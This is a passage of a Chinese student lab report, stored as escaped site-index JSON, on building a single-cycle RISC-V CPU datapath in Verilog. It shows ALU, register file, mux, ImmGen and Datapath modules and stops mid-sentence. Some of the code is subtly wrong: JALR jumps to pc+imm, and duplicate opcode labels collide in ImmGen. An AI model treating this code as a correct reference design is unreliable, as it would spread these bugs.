<p>\u4ec5\u4f9b\u5b66\u4e60\u53c2\u8003\uff0c\u8bf7\u52ff\u6284\u88ad</p>"},{"location":"cs/system/cs1/lab5-1/#_1","title":"\u5b9e\u9a8c\u5185\u5bb9","text":"<ul> <li>\u5b8c\u6210 32 \u4f4d\u5355\u5468\u671f CPU \u6570\u636e\u901a\u8def\u8bbe\u8ba1<ul> <li>\u5b9e\u73b0 lw sw bne beq jal lui addi add slt slti \u6307\u4ee4</li> </ul> </li> <li>\u6839\u636e\u63d0\u4f9b\u7684\u6d4b\u8bd5\u6587\u4ef6\u8fdb\u884c\u4eff\u771f\u6d4b\u8bd5</li> <li>\u6839\u636e\u63d0\u4f9b\u7684\u6d4b\u8bd5\u73af\u5883\u8fdb\u884c\u4e0a\u73ed\u9a8c\u8bc1</li> <li>bonus\uff1a\u6307\u4ee4\u6269\u5c55<ul> <li>\u5b9e\u73b0 andi ori and or sll</li> <li>\u5b9e\u73b0 xori slli srli srl</li> <li>\u5b9e\u73b0 auipc sltu jalr</li> </ul> </li> </ul>"},{"location":"cs/system/cs1/lab5-1/#_2","title":"\u6570\u636e\u901a\u8def\u8bbe\u8ba1","text":""},{"location":"cs/system/cs1/lab5-1/#_3","title":"\u660e\u786e\u5df2\u7ed9\u4ee3\u7801","text":""},{"location":"cs/system/cs1/lab5-1/#cpu_1","title":"CPU \u76f8\u5173\u90e8\u5206","text":"<p>\u548c\u5355\u5468\u671f CPU \u672c\u8eab\u6709\u5173\u7684\u6838\u5fc3\u4ee3\u7801\u6709</p>"},{"location":"cs/system/cs1/lab5-1/#controlv","title":"Control.v","text":"<p>\u901a\u8fc7 Control.edf \u4f7f\u7528\uff0c\u5728\u4eff\u771f\u65f6\u4f7f\u7528 Control_sim.v \u6587\u4ef6\u4e2d\u7684 Control\u3002\u529f\u80fd\u662f CPU \u7684\u63a7\u5236\u90e8\u5206\uff0c\u5176 Control \u6a21\u5757\u7684\u8f93\u5165\u8f93\u51fa\u90e8\u5206\uff1a <pre><code>input   [6:0]   op_code;\ninput   [2:0]   funct3;\ninput           funct7_5;\noutput  [1:0]   pc_src;\noutput          reg_write;\noutput          alu_src_b;\noutput  [3:0]   alu_op;\noutput  [1:0]   mem_to_reg;\noutput          mem_write;\noutput          branch;\noutput          b_type;\n</code></pre> \u8f93\u5165\u4e3a RISC-V 32 \u4f4d\u6307\u4ee4\u7684\u4e09\u4e2a\u90e8\u5206\uff0cop_code \u4e3a\u4f4e 7 \u4f4d\u7684\u64cd\u4f5c\u7801\uff0cfunct3 \u4e3a inst[14:12] \u7684\u529f\u80fd\u90e8\u5206\uff0cfunct7_5 \u4e3a funct7 \u7684\u7b2c\u4e94\u4f4d\u4e5f\u5c31\u662f inst[30]</p> <p>\u8f93\u51fa\u4e3a\u8bd1\u7801\u5f97\u5230\u7684\u4e00\u4e9b\u7ed3\u679c\uff1a</p> <ul> <li>pc_src\uff1apc \u6765\u6e90\uff0c00 \u6765\u81ea pc+4\u300101 \u6765\u81ea JALR\u300110 \u6765\u81ea JAL</li> <li>reg_write\uff1a\u662f\u5426\u5199\u5165\u5bc4\u5b58\u5668\u7ec4</li> <li>alu_src_b\uff1aALUsrc\uff0c0 \u8868\u793a ALU \u7684\u7b2c\u4e8c\u4e2a\u64cd\u4f5c\u6570\u6765\u81ea\u5bc4\u5b58\u5668\uff0c1 \u8868\u793a\u6765\u81ea\u7acb\u5373\u6570</li> <li>alu_op\uff1aALU \u8fdb\u884c\u7684\u64cd\u4f5c\u7b26\uff0c\u5728 AluOp.vh \u4e2d\u5b9a\u4e49</li> <li>mem_to_reg\uff1a\u5199\u56de\u5bc4\u5b58\u5668\u7684\u6570\u636e\u6765\u6e90\uff0c00 \u5199\u56de\u6570\u636e\u6765\u81ea ALU\u300101 \u6765\u81ea\u7acb\u5373\u6570\u300110 \u6765\u81ea pc+4\u300111 \u6765\u81ea data memory</li> <li>mem_write\uff1a\u662f\u5426\u5199\u5165 data memory\uff0c0 \u8868\u793a\u8bfb\uff0c1 \u8868\u793a\u5199</li> <li>branch\uff1a\u6307\u4ee4\u662f\u5426\u662f branch \u5206\u652f\u64cd\u4f5c\uff0c1 \u8868\u793a\u662f\uff0c0 \u4e0d\u662f</li> <li>b_type\uff1a\u5206\u652f\u64cd\u4f5c\u7c7b\u578b\uff0c0 \u8868\u793a bne\u30011 \u8868\u793a beq</li> </ul>"},{"location":"cs/system/cs1/lab5-1/#scpuv","title":"SCPU.v","text":"<p>\u5355\u5468\u671f CPU \u7ed3\u6784\u6587\u4ef6\uff0c\u7528\u4e8e\u8fde\u63a5 CPU \u7684\u63a7\u5236\u90e8\u5206\u548c\u6570\u636e\u901a\u8def\u90e8\u5206\uff0cSCPU \u6a21\u5757\u8f93\u5165\u8f93\u51fa\u90e8\u5206\uff1a <pre><code>input           clk,\ninput           rst,\ninput   [31:0]  inst,\ninput   [31:0]  data_in,  // data from data memory\ninput   [4:0]   debug_reg_addr,\noutput  [31:0]  addr_out, // data memory address\noutput  [31:0]  data_out, // data to data memory\noutput  [31:0]  pc_out,   // connect to instruction memory\noutput          mem_write,\noutput  [31:0]  debug_reg\n</code></pre> \u8f93\u5165\u6709\u5355\u5468\u671f CPU \u65f6\u949f clk\uff0c\u590d\u4f4d\u4fe1\u53f7 rst\uff0c\u6307\u4ee4 inst\uff0c\u4ece data memory \u83b7\u53d6\u7684\u6570\u636e data_in\uff0c\u7528\u4e8e\u4e0a\u677f\u65f6 debug \u8f93\u51fa\u5bc4\u5b58\u5668\u503c\u7684\u5bc4\u5b58\u5668\u5730\u5740 debug_reg_addr\u3002</p> <p>\u8f93\u51fa\u6709\u8981\u64cd\u4f5c data memory \u7684\u5730\u5740 addr_out\uff0c\u8981\u4f20\u7ed9 data memory \u7684\u6570\u636e data_out\uff0c\u63a5\u5165 instruction memory \u7684 pc \u6307\u9488\u503c pc_out\uff0c\u662f\u5426\u5199\u5165 data memory \u7684 mem_write\uff0c\u4ee5\u53ca\u5f97\u5230\u7684 debug \u8981\u663e\u793a\u7684\u5bc4\u5b58\u5668\u503c debug_reg\u3002</p> <p>\u6a21\u5757\u4e2d\u95f4\u5c06 inst \u62c6\u5206\u8fde\u63a5\u5230\u4e86 Control \u6a21\u5757\uff0c\u518d\u5c06 Control \u6a21\u5757\u7684\u8f93\u51fa\u8fde\u63a5\u5230 Datapath \u7684\u8f93\u5165\uff0cDatapath \u7684\u8f93\u51fa\u4f5c\u4e3a SCPU \u7684\u8f93\u51fa\u3002</p>"},{"location":"cs/system/cs1/lab5-1/#corev","title":"Core.v","text":"<p>\u5c06 SCPU \u4e0e data memory\uff08ip \u6838\u4e2d\u7684 RAM\uff09\u548c instruction memory\uff08ip \u6838\u4e2d\u7684 ROM\uff09\u8fde\u63a5\uff0c\u5e76\u5904\u7406 SCPU \u7684\u65f6\u949f\u548c data memory \u7684\u65f6\u949f\uff0c\u518d\u63d0\u4f9b\u4e00\u4e9b\u7528\u4e8e debug \u7684\u8f93\u5165\u8f93\u51fa</p>"},{"location":"cs/system/cs1/lab5-1/#_4","title":"\u5176\u5b83\u6587\u4ef6","text":"<ul> <li> <p>Top.\u200csv</p> <p>\u7528\u4e8e\u4e0a\u677f\u9a8c\u8bc1\u7684\u9876\u5c42\u6a21\u5757\uff0c\u5176\u4e2d\u5c06 Core \u8fde\u63a5\u5230\u4e86 IO_Manager \u4e2d\u6765\u4e3a FPGA \u677f\u5b50\u63d0\u4f9b\u8f93\u5165\u8f93\u51fa\u7684\u63a7\u5236\u3002</p> </li> <li> <p>IO_Manager.sv</p> <p>\u4e3a FPGA \u677f\u5b50\u63d0\u4f9b\u8f93\u5165\u8f93\u51fa\u7684\u6a21\u5757\uff0c\u5176\u4e2d\u5904\u7406\u4e86\u5f00\u53d1\u7248\u4e0a\u7684\u6309\u952e\u3001\u5f00\u5173\uff0c\u4ee5\u53ca\u4e03\u6bb5\u7ba1\u7684\u8f93\u51fa\u3002</p> </li> <li> <p>Core_tb.sv</p> <p>Core \u6a21\u5757\u7684 test bench\uff0c\u8fdb\u884c\u4eff\u771f\u6d4b\u8bd5\u7684\u65f6\u5019\u5c06\u8fd9\u4e2a\u6587\u4ef6\u8bbe\u4e3a\u9700\u8981\u4eff\u771f\u7684\u6587\u4ef6\u3002</p> </li> <li> <p>AluOp.vh</p> <p>\u91cc\u9762\u4e3a ALU \u8981\u8fdb\u884c\u7684\u8fd0\u7b97\u63d0\u4f9b\u4e86\u53d8\u91cf\u540d\uff0c\u5b9e\u73b0 ALU \u65f6\u8981\u6309\u7167\u91cc\u9762\u7684\u89c4\u5b9a\u6765\u6267\u884c\u8fd0\u7b97\u3002</p> </li> </ul>"},{"location":"cs/system/cs1/lab5-1/#_5","title":"\u660e\u786e\u76ee\u6807","text":"<p>\u5b8c\u6210\u6570\u636e\u901a\u8def\u8bbe\u8ba1\u7684\u76ee\u6807\u6709\u4ee5\u4e0b\u51e0\u4e2a\uff1a</p> <ul> <li>\u7f16\u5199 ALU \u6a21\u5757\uff0c\u5b8c\u6210 AluOp.vh \u6587\u4ef6\u4e2d\u89c4\u5b9a\u7684\u8fd0\u7b97</li> <li>\u7f16\u5199\u5bc4\u5b58\u5668 Regs \u6a21\u5757\uff0c\u5b58\u50a8 31 \u4e2a 32 \u4f4d\u5bc4\u5b58\u5668\uff08\u7b2c 0 \u4e2a\u662f 0\uff09\uff0c\u5904\u7406\u5bc4\u5b58\u5668\u7684\u8bfb\u5199\u64cd\u4f5c</li> <li>\u7f16\u5199\u4e00\u4e9b Mux \u6a21\u5757\u7528\u4e8e\u6570\u636e\u901a\u8def\u4e2d\u7684\u591a\u8def\u9009\u62e9</li> <li>\u7f16\u5199 ImmGen \u6a21\u5757\uff0c\u7528\u6765\u4ece\u6307\u4ee4\u4e2d\u89e3\u6790\u51fa\u7acb\u5373\u6570</li> <li>\u7f16\u5199 Datapath \u6a21\u5757\uff0c\u8fde\u63a5\u8d77\u6570\u636e\u901a\u8def</li> <li>\u5728 SCPU \u6a21\u5757\u4e2d\u6b63\u786e\u8fde\u63a5 Control \u4e0e Datapath\uff08\u5df2\u7ecf\u505a\u597d\uff09</li> <li>\u5728 Core \u6a21\u5757\u4e2d\u8fde\u63a5 SCPU \u4e0e RAM ROM</li> </ul>"},{"location":"cs/system/cs1/lab5-1/#_6","title":"\u6a21\u5757\u7f16\u5199\u4e0e\u8fde\u63a5","text":""},{"location":"cs/system/cs1/lab5-1/#alu","title":"ALU","text":"<p>\u8f93\u5165\u662f\u4e24\u4e2a 32 \u4f4d\u6570 a b \u548c\u8fdb\u884c\u7684\u64cd\u4f5c alu_op\uff0c\u8f93\u51fa\u662f\u7ed3\u679c\u548c zero \u6807\u5fd7\uff0ccase alu_op \u7136\u540e\u5206\u522b\u5b9e\u73b0\u5c31\u53ef\u4ee5\uff1a <pre><code>`timescale 1ns / 1ps\n\nmodule ALU (\n    input       [31:0]  a,\n    input       [31:0]  b,\n    input       [3:0]   alu_op,\n    output reg  [31:0]  res,\n    output              zero\n);\n    `include \"AluOp.vh\"\n    always @(*) begin\n        case (alu_op)\n            ADD: res &lt;= a + b;\n            SUB: res &lt;= a - b;\n            SLL: res &lt;= a &lt;&lt; b;\n            SLT: begin\n                if (a[31] == 0 &amp;&amp; b[31] == 1) res &lt;= 0;\n                else if (a[31] == 1 &amp;&amp; b[31] == 0) res &lt;= 1;\n                else if (a[31] == b[31]) begin\n                    if (a[30:0] &lt; b[30:0]) res &lt;= 1;\n                    else res &lt;= 0;\n                end\n            end\n            SLTU: begin\n                if (a &lt; b) res &lt;= 1;\n                else res &lt;= 0;\n            end\n            XOR: res &lt;= a ^ b;\n            SRL: res &lt;= a &gt;&gt; b;\n            SRA: res &lt;= a &gt;&gt;&gt; b;\n            OR:  res &lt;= a | b;\n            AND: res &lt;= a &amp; b;\n            default: res = 0;\n        endcase\n    end\n    assign zero = (a-b) ? 1'b0 : 1'b1;\nendmodule\n</code></pre></p>"},{"location":"cs/system/cs1/lab5-1/#regs","title":"\u5bc4\u5b58\u5668 Regs","text":"<p>\u5728 lab \u7684 pdf \u6587\u4ef6\u4e2d\u5df2\u7ecf\u7ed9\u51fa\u4e86\u5bc4\u5b58\u5668\u7ec4\u90e8\u5206\u7684\u8bbe\u8ba1\uff0c\u53ea\u9700\u8981\u6dfb\u52a0\u4e00\u4e0b\u5bf9\u4e8e debug_reg_addr \u548c debug_reg \u7684\u8f93\u5165\u8f93\u51fa\u5373\u53ef\uff1a <pre><code>`timescale 1ns / 1ps\n\nmodule Regs (\n    input           clk,\n    input           rst,\n    input           we,\n    input   [4:0]   read_addr_1,\n    input   [4:0]   read_addr_2,\n    input   [4:0]   write_addr,\n    input   [31:0]  write_data,\n    input   [4:0]   debug_reg_addr,\n    output  [31:0]  read_data_1,\n    output  [31:0]  read_data_2,\n    output  [31:0]  debug_reg\n);\n    integer i;\n    reg [31:0] register [1:31]; // x1 - x31, x0 keeps zero\n\n    assign read_data_1 = (read_addr_1 == 0) ? 0 : register[read_addr_1]; // read\n    assign read_data_2 = (read_addr_2 == 0) ? 0 : register[read_addr_2]; // read\n    assign debug_reg = (debug_reg_addr == 0) ? 0 : register[debug_reg_addr];\n\n    always @(posedge clk or posedge rst) begin\n        if (rst == 1) for (i = 1; i &lt; 32; i = i + 1) register[i] &lt;= 0; // reset\n        else if (we == 1 &amp;&amp; write_addr != 0) register[write_addr] &lt;= write_data;\n    end\nendmodule\n</code></pre></p>"},{"location":"cs/system/cs1/lab5-1/#mux","title":"\u591a\u8def\u9009\u62e9\u5668 Mux","text":"<p>\u9996\u5148\u5b9e\u73b0\u666e\u901a\u7684 32 \u4f4d 2 \u8def\u9009\u62e9\u5668 Mux2x32 \u548c 32 \u4f4d 4 \u8def\u9009\u62e9\u5668 Mux4x32\uff1a <pre><code>`timescale 1ns / 1ps\n\nmodule Mux2x32 (\n    input   [31:0]  I0,\n    input   [31:0]  I1,\n    input           s,\n    output  [31:0]  o\n);\n    assign o = s ? I1 : I0;\nendmodule\n\nmodule Mux4x32 (\n    input   [31:0]  I0,\n    input   [31:0]  I1,\n    input   [31:0]  I2,\n    input   [31:0]  I3,\n    input   [1:0]   s,\n    output  [31:0]  o\n);\n    reg [31:0] out;\n    always @(*) begin\n        case (s)\n            2'b00: out &lt;= I0;\n            2'b01: out &lt;= I1;\n            2'b10: out &lt;= I2;\n            2'b11: out &lt;= I3;\n        endcase\n    end\n    assign o = out;\nendmodule\n</code></pre> \u7136\u540e\u518d\u5b9e\u73b0\u4e00\u4e2a\u7528\u4e8e\u5904\u7406\u6700\u540e PC \u7ed3\u679c\u7684\u7279\u6b8a\u9009\u62e9\u5668\uff08\u5373\u9700\u8981\u5224\u65ad\u4e00\u4e0b\u662f\u5426\u6709\u5206\u652f\u4ee5\u53ca\u5206\u652f\u662f\u5426\u6210\u7acb\uff09\uff1a <pre><code>module MuxPC (\n    input   [31:0]  I0,         // pc+4\n    input   [31:0]  I1,         // JALR \u7684\u5730\u5740\n    input   [31:0]  I2,         // JAL \u7684\u5730\u5740\n    input   [31:0]  I3,         // branch \u7684\u5730\u5740\n    input   [1:0]   s,          // pc_src\n    input           branch,     // \u662f\u5426\u5206\u652f\n    input           b_type,     // 0 bne, 1 beq\n    input   [31:0]  alu_res,    // alu \u7684\u7ed3\u679c\uff0c\u7528\u6765\u5224\u65ad\u5206\u652f\u662f\u5426\u6210\u7acb\n    output  [31:0]  o           // \u7ed3\u679c\u7684 pc\n);\n    reg [31:0] out;\n    always @(*) begin\n        if (branch) begin // \u6709\u5206\u652f\u64cd\u4f5c\n            if (b_type) begin // beq\n                if (alu_res == 32'b0)   out &lt;= I3; // \u5206\u652f\n                else                    out &lt;= I0;\n            end\n            else begin // bne\n                if (alu_res == 32'b0)   out &lt;= I0;\n                else                    out &lt;= I3; // \u5206\u652f\n            end\n        end\n        else begin\n            case (s)\n                2'b00: out &lt;= I0;\n                2'b01: out &lt;= I1;\n                2'b10: out &lt;= I2;\n                2'b11: out &lt;= I3;\n            endcase\n        end\n    end\n    assign o = out;\nendmodule\n</code></pre></p>"},{"location":"cs/system/cs1/lab5-1/#immgen","title":"\u89e3\u6790\u7acb\u5373\u6570 ImmGen","text":"<p>\u5148\u901a\u8fc7\u4e00\u4e2a Opcodes.vh \u6587\u4ef6\u5b9a\u4e49\u4e00\u4e9b\u8981\u7528\u7684\u6307\u4ee4\u540d\u548c opcode \u7684\u5bf9\u5e94\u4ee5\u53ca\u6307\u4ee4\u7c7b\u578b\u7684\u679a\u4e3e\uff1a <pre><code>//`ifndef OPCODES_H\n//`define OPCODES_H\nparameter   LW      = 7'b0000011,\n            SW      = 7'b0100011,\n            ADDI    = 7'b0010011,\n            BNE     = 7'b1100011,\n            BEQ     = 7'b1100011,\n            JAL     = 7'b1101111,\n            LUI     = 7'b0110111,\n            ADD     = 7'b0110011,\n            SLT     = 7'b0110011,\n            SLTI    = 7'b0010011,\n            ANDI    = 7'b0010011,\n            ORI     = 7'b0010011,\n            AND     = 7'b0110011,\n            OR      = 7'b0110011,\n            SLL     = 7'b0110011,\n            XORI    = 7'b0010011,\n            SLLI    = 7'b0010011,\n            SRLI    = 7'b0010011,\n            SRL     = 7'b0110011,\n            AUIPC   = 7'b0010111,\n            SLTU    = 7'b0110011,\n            JALR    = 7'b1100111;\n\nparameter   R   = 3'b000,\n            I   = 3'b001,\n            S   = 3'b010,\n            B   = 3'b011,\n            U   = 3'b100,\n            J   = 3'b101;\n//`endif\n</code></pre> \u7136\u540e\u518d\u7f16\u5199\u4e00\u4e2a ImmGen \u6a21\u5757\u6765\u8bc6\u522b opcode\u3001\u5206\u7c7b\u6307\u4ee4\u3001\u83b7\u53d6\u7acb\u5373\u6570\uff0c\u5bf9\u4e8e\u51e0\u79cd\u6307\u4ee4\uff0c\u83b7\u53d6\u7684\u7acb\u5373\u6570\u5206\u522b\u662f\uff1a</p> <ul> <li>R \u578b\uff1a20 \u4e2a\u4e0e inst[31] \u76f8\u540c\u7684\u7b26\u53f7\u4f4d\u6269\u5c55\u6bd4\u7279\u548c inst[31:20]</li> <li>I \u578b\uff1a\u540c R \u578b</li> <li>S \u578b\uff1a20 \u4e2a\u4e0e inst[31] \u76f8\u540c\u7684\u7b26\u53f7\u4f4d\u6269\u5c55\u6bd4\u7279\u548c inst[31:25] + inst[11:7]</li> <li>B \u578b\uff1a19 \u4e2a\u4e0e inst[31] \u76f8\u540c\u7684\u7b26\u53f7\u4f4d\u6269\u5c55\u6bd4\u7279\u548c inst[31] + inst[7] + inst[30:25] + inst[11:8]\uff0c\u6700\u540e\u4e00\u4f4d\u8865 0\uff08\u76f8\u5f53\u4e8e\u9884\u5148\u8fdb\u884c\u4e86\u5206\u652f\u65f6\u7684 imm &lt;&lt; 1 \u64cd\u4f5c\uff09</li> <li>U \u578b\uff1ainst[31:12] \u540e\u9762\u8865 12 \u4e2a 0</li> <li>J \u578b\uff1a11 \u4e2a\u4e0e inst[31] \u76f8\u540c\u7684\u7b26\u53f7\u4f4d\u6269\u5c55\u6bd4\u7279\u548c inst[31] + inst[19:12] + inst[20] + inst[30:21]\uff0c\u6700\u540e\u4e00\u4f4d\u8865 0</li> </ul> <p>\u6839\u636e\u8fd9\u4e9b\u89c4\u5219\u4ee5\u53ca\u6307\u4ee4\u548c\u7c7b\u578b\u7684\u5bf9\u5e94\u53ef\u4ee5\u5199\u51fa ImmGen \u7c7b\uff1a <pre><code>`timescale 1ns / 1ps\n\nmodule ImmGen(\n    input   [31:0]  inst,\n    output  [31:0]  imm\n);\n    `include \"Opcodes.vh\"\n    reg [3:0] type;\n    reg [31:0] out;\n    assign imm = out;\n    always @(*) begin\n        case (inst[6:0])\n            LW:     type &lt;= I;\n            SW:     type &lt;= S;\n            ADDI:   type &lt;= I;\n            BNE:    type &lt;= B;\n            BEQ:    type &lt;= B;\n            JAL:    type &lt;= J;\n            LUI:    type &lt;= U;\n            ADD:    type &lt;= R;\n            SLT:    type &lt;= R;\n            SLTI:   type &lt;= I;\n            ANDI:   type &lt;= I;\n            ORI:    type &lt;= I;\n            AND:    type &lt;= R;\n            OR:     type &lt;= R;\n            SLL:    type &lt;= R;\n            XORI:   type &lt;= I;\n            SLLI:   type &lt;= R;\n            SRLI:   type &lt;= R;\n            SRL:    type &lt;= R;\n            AUIPC:  type &lt;= U;\n            SLTU:   type &lt;= R;\n            JALR:   type &lt;= I;\n        endcase\n        case (type)\n            R: out &lt;= {{20{inst[31]}}, inst[31:20]};\n            I: out &lt;= {{20{inst[31]}}, inst[31:20]};\n            S: out &lt;= {{20{inst[31]}}, inst[31:25], inst[11:7]};\n            B: out &lt;= {{19{inst[31]}}, inst[31], inst[7], inst[30:25], inst[11:8], 1'b0};\n            U: out &lt;= {inst[31:12], 12'b0};\n            J: out &lt;= {{11{inst[31]}}, inst[31], inst[19:12], inst[20], inst[30:21], 1'b0};\n        endcase\n    end\nendmodule\n</code></pre></p>"},{"location":"cs/system/cs1/lab5-1/#datapath","title":"\u6570\u636e\u901a\u8def Datapath","text":"<p>\u6839\u636e\u524d\u9762\u5199\u597d\u7684\u6a21\u5757\u4ee5\u53ca\u5206\u6790\uff0c\u8fd8\u6709 pdf \u7ed9\u51fa\u7684\u6570\u636e\u901a\u8def\u8bbe\u8ba1\u56fe\u5c31\u53ef\u4ee5\u5199\u51fa\u6570\u636e\u901a\u8def\u90e8\u5206\u7684\u4ee3\u7801\uff1a <pre><code>`timescale 1ns / 1ps\n\nmodule Datapath(\n    input           clk,\n    input           rst,\n    input   [1:0]   pc_src,     // pc \u6765\u6e90\n    input           reg_write,  // \u662f\u5426\u5199\u5165\u5bc4\u5b58\u5668\n    input           alu_src_b,  // ALUsrc\n    input           branch,     // \u662f\u5426\u4e3a branch \u7c7b\u578b\u7684\u6307\u4ee4\n    input           b_type,     // branch \u7c7b\u578b\n    input   [3:0]   alu_op,     // ALU operation\n    input   [1:0]   mem_to_reg, // MemtoReg\n    input   [31:0]  inst_in,    // \u5f53\u524d\u6307\u4ee4\n    input   [31:0]  data_in,    // data from data memory\n    output  [31:0]  addr_out,   // data memory address\n    output  [31:0]  data_out,   // data to data memory\n    output  [31:0]  pc_out,     // connect to instruction memory\n    input   [4:0]   debug_reg_addr,\n    output  [31:0]  debug_reg\n);\n    reg     [31:0]  pc;\n    wire    [31:0]  pc_next;\n    wire    [31:0]  write_data, read_data_1, read_data_2;\n    wire    [31:0]  mux_out_1, alu_result;\n    wire            alu_zero;\n    wire    [31:0]  imm;\n    wire    [31:0]  jmp_addr;\n\n    assign pc_out = pc;\n    assign addr_out = alu_result;\n    assign data_out = read_data_2;\n\n    always @(posedge clk or posedge rst) begin\n        if (rst) begin\n            pc &lt;= 32'b0;        // \u5bf9 pc \u590d\u4f4d\n        end\n        else begin\n            pc &lt;= pc_next;      // \u8bbe\u7f6e pc \u7684\u65b0\u503c\n        end\n    end\n\n    Regs regs (     // \u8fde\u63a5\u5bc4\u5b58\u5668\u7ec4\n        .clk(clk),\n        .rst(rst),\n        .we(reg_write),\n        .read_addr_1(inst_in[19:15]),\n        .read_addr_2(inst_in[24:20]),\n        .write_addr(inst_in[11:7]),\n        .write_data(write_data),\n        .read_data_1(read_data_1),\n        .read_data_2(read_data_2),\n        .debug_reg_addr(debug_reg_addr),\n        .debug_reg(debug_reg)\n    );\n\n    ImmGen immgen ( // \u8fde\u63a5 ImmGen\uff0c\u4ece inst_in \u4e2d\u83b7\u5f97\u7acb\u5373\u6570 imm\n        .inst(inst_in),\n        .imm(imm)\n    );\n\n    Mux2x32 mux2x32 (   // \u9009\u62e9 ALU \u7b2c\u4e8c\u4e2a\u8f93\u5165\n        .I0(read_data_2),\n        .I1(imm),\n        .s(alu_src_b),\n        .o(mux_out_1)\n    );\n\n    ALU alu (   // \u8fdb\u884c ALU \u8fd0\u7b97\uff0c\u7b2c\u4e00\u4e2a\u8f93\u5165\u662f\u5bc4\u5b58\u5668\uff0c\u7b2c\u4e8c\u4e2a\u662f\u9009\u62e9\u5668\u7684\u7ed3\u679c\n        .a(read_data_1),\n        .b(mux_out_1),\n        .alu_op(alu_op),\n        .res(alu_result),\n        .zero(alu_zero)\n    );\n\n    Mux4x32 mux4x32 (   // \u9009\u62e9\u5199\u5165 data memory \u7684\u6570\u636e\n        .I0(alu_result),\n        .I1(imm),\n        .I2(pc + 4),\n        .I3(data_in),\n        .s(mem_to_reg),\n        .o(write_data)\n    );\n\n    assign jmp_addr = pc + imm; // \u5f97\u5230\u8df3\u8f6c\u6307\u4ee4\u7684\u8df3\u8f6c\u76ee\u6807\n\n    MuxPC mux_pc (  // \u9009\u62e9 pc \u7684\u65b0\u503c\n        .I0(pc + 4),    // \u76f4\u63a5\u52a0 4\n        .I1(jmp_addr),  // JALR \u8df3\u8f6c\u5730\u5740\n        .I2(jmp_addr),  // JAL \u8df3\u8f6c\u5730\u5740\n        .I3(jmp_addr),  // branch \u8df3\u8f6c\u5730\u5740\n        .s(pc_src),\n        .branch(branch),\n        .b_type(b_type),\n        .alu_res(alu_result),\n        .o(pc_next)     // pc \u7684\u65b0\u503c\n    );\nendmodule\n</code></pre> \u8fd9\u6837\u5c31\u8fd0\u7528\u4e86\u8fd9\u4e9b\u6a21\u5757\uff0c\u5c06\u5176\u8fde\u63a5\u5728\u4e86\u4e00\u8d77\u5f62\u6210\u4e86\u6570\u636e\u901a\u8def\u3002</p>"},{"location":"cs/system/cs1/lab5-1/#ram-rom","title":"\u8fde\u63a5 RAM ROM","text":"<p>\u76f4\u63a5\u5c06\u63d0\u4f9b\u7684 Ram.xci \u548c Rom.xci \u8f7d\u5165 vivado \u5c31\u53ef\u4ee5\u751f\u6210 ip \u6838\uff0c\u7136\u540e\u518d Core.v \u6587\u4ef6\u4e2d\u6839\u636e\u63d0\u793a\u8fde\u63a5\uff1a <pre><code>Rom rom_unit (\n    .a(pc_out/4),   // \u5730\u5740\u8f93\u5165\n    .spo(inst)      // \u8bfb\u6570\u636e\u8f93\u51fa\n);\n\nRam ram_unit (\n    .clka(mem_clk),         // \u65f6\u949f\n    .wea(mem_write),        // \u662f\u5426\u5199\u6570\u636e\n    .addra(addr_out),       // \u5730\u5740\u8f93\u5165\n    .dina(core_data_out),   // \u5199\u6570\u636e\u8f93\u5165\n    .douta(core_data_in)    // \u8bfb\u6570\u636e\u8f93\u51fa\n);\n</code></pre> Rom \u7684\u8f93\u5165\u9700\u8981\u5c06 pc \u9664 4 \u56e0\u4e3a Rom \u8bfb\u53d6\u7684\u65f6\u5019\u6bcf 32 \u4f4d\u5f53\u4f5c\u4e00\u4e2a\u5143\u7d20\uff0c\u800c\u4e0d\u662f\u6bcf\u4e2a\u5b57\u8282\u4e00\u4e2a\u5143\u7d20\u3002</p> <p>Ram \u7684\u65f6\u949f\u8981\u662f mem_clk \u800c\u4e0d\u662f cpu_clk\uff0c\u4e0d\u7136\u4f1a\u4f7f data memory \u7684\u8f93\u5165\u8f93\u51fa\u88ab\u4f7f\u7528\u65f6\u9519\u5f00\u4e00\u4e2a\u5468\u671f\uff0c\u5269\u4e0b\u7684 mem_write\u3001addr_out\u3001core_data_out\u3001core_data_in \u90fd\u662f Core \u6a21\u5757\u4e2d\u5199\u597d\u7684\u4ece SCPU \u4e2d\u83b7\u5f97\u7684\u8f93\u51fa\u3002</p> <p>\u6700\u540e\u5728 Core \u672b\u5c3e\u7528\u4e8e debug \u7684\u90e8\u5206\u6839\u636e\u63d0\u793a\u6765\u8f93\u51fa\u60f3\u8981\u5f97\u5230\u7684\u5bc4\u5b58\u5668\u7684\u503c\uff1a <pre><code>assign chip_debug_out3 = debug_reg;\n</code></pre></p> <p>\u8fd9\u6837\u6574\u4e2a\u6570\u636e\u901a\u8def\u7684\u8bbe\u8ba1\u548c\u6574\u4f53\u7684\u8fde\u63a5\u5c31\u5b8c\u6210\u4e86\u3002</p>"},{"location":"cs/system/cs1/lab5-1/#_7","title":"\u4eff\u771f\u6d4b\u8bd5","text":"<p>vivado \u4e2d\u8f7d\u5165 ip \u6838\u7684\u65f6\u5019\u76f4\u63a5\u9009\u62e9\u5e26\u6709\u8981\u6c42\u5b9e\u73b0\u7684\u5168\u90e8\u5341\u4e2a\u6307\u4ee4 lw sw bne beq jal lui addi add slt slti \u7684 coe \u53c2\u6570\u6587\u4ef6 lab10_all.coe\uff0c\u4e0e\u4e4b\u5bf9\u5e94\u7684\u6c47\u7f16\u6587\u4ef6\u5c31\u662f lab10_all.asm</p> <p>\u7136\u540e\u9009\u62e9 Core_tb.sv \u4e3a\u76ee\u6807\u8fdb\u884c\u4eff\u771f\u6d4b\u8bd5\uff0c\u518d\u901a\u8fc7\u8c03\u6574\u5f97\u5230\u5168\u90e8\u4e2d\u95f4\u53d8\u91cf\uff08\u5bc4\u5b58\u5668\u7ec4\u503c\u3001ALU \u8f93\u5165\u8f93\u51fa\u3001Mux \u8f93\u5165\u8f93\u51fa\u7b49\uff09\u5f97\u5230\u4eff\u771f\u6ce2\u5f62\uff1a </p> <p>\u4ee5\u53ca pc \u548c\u5bc4\u5b58\u5668\u7684\u6ce2\u5f62\u6570\u636e\uff1a </p> <p>\u901a\u8fc7\u4ed4\u7ec6\u5206\u6790\u6bcf\u4e00\u6761\u6c47\u7f16\u6307\u4ee4\u4e0e\u6240\u6709\u503c\u7684\u53d8\u5316\u3001\u5bc4\u5b58\u5668\u7684\u53d8\u5316\u53ef\u4ee5\u770b\u51fa CPU \u6309\u7167\u7ed9\u51fa\u7684\u6307\u4ee4\u6b63\u786e\u8fd0\u884c\u4e86\u3002</p>"},{"location":"cs/system/cs1/lab5-1/#_8","title":"\u4e0a\u677f\u9a8c\u8bc1","text":"<p>\u5728 vivado \u4e2d disable \u6389 Control_sim.v 